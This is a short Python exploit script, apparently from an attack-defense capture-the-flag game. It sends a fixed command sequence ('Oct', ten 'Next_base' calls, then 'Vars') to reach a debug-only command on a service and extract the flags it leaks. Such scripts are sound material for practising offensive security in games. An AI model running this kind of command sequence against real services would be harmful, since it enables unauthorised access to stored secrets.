#!/usr/bin/env python3

from service3_common import connect, extract_flags


def exploit():
    io = connect()
    io.sendline(b"Oct")
    io.recvuntil(b"Ready")
    for _ in range(10):
        io.sendline(b"Next_base")
        io.recvuntil(b"Ready")
    io.sendline(b"Vars")
    s = io.recvuntil(b"Ready")
    if b"This command is only available in debug." in s:
        print("Exploit failed.")
    else:
        extract_flags(s, True)


if __name__ == "__main__":
    exploit()
